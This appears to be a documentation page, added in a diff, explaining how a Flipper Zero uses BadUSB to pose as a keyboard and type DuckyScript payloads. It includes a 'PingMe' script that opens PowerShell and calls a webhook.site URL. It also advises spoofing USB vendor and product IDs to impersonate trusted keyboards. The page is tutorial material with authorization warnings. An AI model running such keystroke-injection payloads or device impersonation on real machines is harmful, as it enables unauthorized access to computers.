@@ -1,0 +1,211 @@
+---
+title: "BadUSB overview"
+description: "How Flipper Zero emulates a USB HID keyboard to execute DuckyScript payloads on a target computer."
+---
+
+When you plug a Flipper Zero into a computer's USB port with a BadUSB payload loaded, the host sees a USB Human Interface Device (HID) — specifically, a keyboard. The Flipper then replays the script as a sequence of keystrokes at machine speed. No driver installation, no pop-up prompts, no user interaction required. The target computer trusts it because keyboards are always trusted.
+
+<Warning>
+  BadUSB payloads execute with the privileges of the logged-in user. Only run scripts on systems you own or have explicit written authorization to test. Unauthorized use is illegal in most jurisdictions and violates the acceptable use policies of any system you don't control.
+</Warning>
+
+## How Flipper Zero does it
+
+The Flipper Zero exposes itself as a USB HID keyboard (and optionally a mouse) using its USB-C port. When a BadUSB script runs, the Flipper reads each line of a `.txt` DuckyScript file and sends the corresponding HID keycodes to the host. From the operating system's perspective, a very fast typist just opened a terminal and ran some commands.
+
+The BadUSB app ships with the official Flipper firmware. No additional firmware or application installation is needed.
+
+### VID/PID customization
+
+Every USB device advertises a Vendor ID (VID) and Product ID (PID). By default, the Flipper uses its own identifiers, which may be recognizable on security-conscious systems. You can change these values in the BadUSB app settings to impersonate a trusted device — for example, a well-known keyboard brand.
+
+<Tip>
+  Use [this searchable VID/PID list](https://www.the-sz.com/products/usbid/) to find identifiers for real keyboards you want to impersonate. Matching a device the target machine has seen before can increase execution trust.
+</Tip>
+
+---
+
+## DuckyScript syntax
+
+Flipper Zero's BadUSB app uses a Flipper-compatible dialect of DuckyScript — the same scripting language used by the Hak5 USB Rubber Ducky. Scripts are plain `.txt` files stored on the SD card.
+
+### Core commands
+
+| Command | Description |
+|---|---|
+| `REM` | Comment. Ignored during execution. |
+| `DELAY <ms>` | Pause execution for the specified number of milliseconds. |
+| `STRING <text>` | Type the literal text string, character by character. |
+| `ENTER` | Press the Enter / Return key. |
+| `GUI` | The Windows key (or macOS Command key). Combine with a letter: `GUI r` opens Run. |
+| `CTRL` | The Control key. Combine: `CTRL c` copies, `CTRL ALT t` opens a terminal. |
+| `ALT` | The Alt key. |
+| `SHIFT` | The Shift key. |
+| `TAB` | The Tab key. |
+| `ESCAPE` | The Escape key. |
+| `SPACE` | The Space key. |
+| `BACKSPACE` | The Backspace key. |
+| `DELETE` | The Delete key. |
+| `UP` / `DOWN` / `LEFT` / `RIGHT` | Arrow keys. |
+| `F1`–`F12` | Function keys. |
+| `CAPSLOCK` | Toggles Caps Lock. |
+| `PRINTSCREEN` | Print Screen key. |
+
+Modifier keys can be chained: `CTRL ALT DELETE`, `GUI SHIFT s`, `ALT F4`.
+
+<Tip>
+  For the complete list of supported key names — including numpad keys, media keys, and special characters — see [this DuckyScript key reference](https://gist.github.com/methanoliver/efebfe8f4008e167417d4ab96e5e3cac).
+</Tip>
+
+### A minimal example
+
+The script below opens Windows Run, launches PowerShell, fires an HTTP request to a webhook URL, and exits. It is a useful connectivity check for pentesting scenarios.
+
+```text PingMe.txt
+REM Title: PingMe
+REM Author: 7h30th3r0n3
+REM Target: Windows 7/8/10/11
+REM Category: Grabber
+REM Designed to be used for mouse hijacking to find out if it is connected to the internet
+GUI r
+DELAY 400
+STRING powershell
+ENTER
+DELAY 400
+STRING Invoke-WebRequest -Uri https://webhook.site/<TOKEN> -Method GET;exit
+ENTER
+```
+
+Replace `<TOKEN>` with your own webhook.site token before use.
+
+### Character compatibility testing
+
+Before deploying a payload that relies on `STRING`, it is worth verifying that special characters type correctly on the target keyboard layout. The `Char_Test.txt` script in this repo opens Notepad and types a series of punctuation characters so you can spot layout mismatches before they break your payload:
+
+```text Char_Test.txt
+REM BadUSB Character Test File
+REM Designed by UberGuidoZ
+REM https://github.com/UberGuidoZ/Flipper
+DELAY 2000
+GUI r
+DELAY 1000
+STRING notepad
+DELAY 500
+ENTER
+DELAY 1500
+STRING ; Semicolon
+DELAY 250
+ENTER
+DELAY 250
+STRING , Comma
+DELAY 250
+ENTER
+DELAY 250
+STRING < Less than
+DELAY 250
+ENTER
+DELAY 250
+STRING > Greater than
+DELAY 250
+ENTER
+DELAY 250
+STRING . Period
+DELAY 250
+ENTER
+DELAY 250
+STRING ? Question mark
+DELAY 250
+ENTER
+DELAY 250
+STRING / Forward slash
+DELAY 250
+ENTER
+DELAY 250
+STRING \ Backslash
+DELAY 250
+ENTER
+DELAY 250
+STRING [ Left bracket
+DELAY 250
+ENTER
+DELAY 250
+STRING ] Right bracket
+DELAY 250
+ENTER
+DELAY 250
+STRING * Asterisk
+DELAY 250
+ENTER
+DELAY 250
+STRING ( Left parentheses
+DELAY 250
+ENTER
+DELAY 250
+STRING ) Right parentheses
+DELAY 250
+ENTER
+DELAY 250
+STRING | Pipe
+DELAY 250
+ENTER
+DELAY 250
+STRING ~ Tilde
+DELAY 250
+ENTER
+DELAY 250
+ENTER
+STRING Done for now! (Created by UberGuidoZ)
+DELAY 250
+ENTER
+DELAY 250
+STRING https://github.com/UberGuidoZ/Flipper
+DELAY 250
+ENTER
+```
+
+---
+
+## Loading a BadUSB script
+
+<Steps>
+  <Step title="Copy the script to your SD card">
+    Place `.txt` script files inside the `badusb/` folder on your Flipper Zero's SD card. You can transfer files using [qFlipper](https://flipperzero.one/update), the Flipper mobile app, or by mounting the SD card directly.
+  </Step>
+  <Step title="Open the BadUSB app">
+    On your Flipper Zero, navigate to **Applications → USB → Bad USB** from the main menu.
+  </Step>
+  <Step title="Select your script">
+    Browse to the `.txt` file you want to run and press the center button to select it.
+  </Step>
+  <Step title="Connect to the target">
+    Plug the Flipper's USB-C port into the target computer. Wait for it to enumerate as a HID device (usually 1–2 seconds).
+  </Step>
+  <Step title="Run the script">
+    Press the center button (or right arrow, depending on firmware) to start execution. The Flipper's screen shows the current line being processed. Press the back button to abort at any time.
+  </Step>
+</Steps>
+
+<Note>
+  DELAY values in scripts account for application launch times. If a script types into the wrong window or mis-times an action, increase the DELAY values for the relevant steps to give slower systems more time to catch up.
+</Note>
+
+---
+
+## USB HID spec reference
+
+Flipper Zero's BadUSB implementation follows the USB Human Interface Device class specification. For low-level detail on keycodes, usage pages, and descriptor formats, see the official [USB HID Usage Tables specification (PDF)](https://usb.org/sites/default/files/hut1_3_0.pdf).
+
+---
+
+## Ethical use
+
+The scripts in this repository are published for educational purposes and authorized security testing. Use them only on systems you own or have explicit permission to test. Deploying BadUSB payloads against systems without authorization is a criminal offense under the Computer Fraud and Abuse Act (US), the Computer Misuse Act (UK), and equivalent laws in most countries.
+
+<CardGroup cols={2}>
+  <Card title="Script library" icon="scroll" href="/badusb/scripts">
+    Browse the full collection of BadUSB scripts organized by category.
+  </Card>
+  <Card title="No-BadUSB defense tool" icon="shield" href="https://github.com/8yr/No-BadUSB-thanks">
+    A community tool for defending against BadUSB attacks on your own machines.
+  </Card>
+</CardGroup>
